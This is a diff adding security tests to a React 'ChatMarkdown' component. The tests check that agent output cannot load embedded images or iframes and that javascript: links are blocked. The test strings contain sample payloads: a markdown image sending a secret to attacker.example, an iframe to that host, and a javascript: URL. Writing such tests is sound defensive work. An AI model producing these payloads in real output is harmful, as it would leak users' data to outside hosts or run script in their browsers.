@@ -57,3 +57,26 @@ describe("ChatMarkdown", () => {
     expect(bq.closest("blockquote")).toBeInTheDocument();
   });
 });
+
+describe("ChatMarkdown security", () => {
+  afterEach(cleanup);
+  it("does not load resources embedded in agent output", () => {
+    const { container } = render(
+      <ChatMarkdown
+        content={
+          '![private content](https://attacker.example/collect?secret=value)\n\n<img src="/api/action">\n<iframe src="https://attacker.example"></iframe>'
+        }
+      />,
+    );
+    expect(container.querySelector("img, iframe, video, audio, embed, script")).toBeNull();
+  });
+
+  it("keeps explicit web links usable and blocks script URLs", () => {
+    render(<ChatMarkdown content="[Docs](https://example.com) [Bad](javascript:alert%281%29)" />);
+    expect(screen.getByRole("link", { name: "Docs" })).toHaveAttribute(
+      "href",
+      "https://example.com",
+    );
+    expect(screen.getByText("Bad")).not.toHaveAttribute("href", "javascript:alert%281%29");
+  });
+});
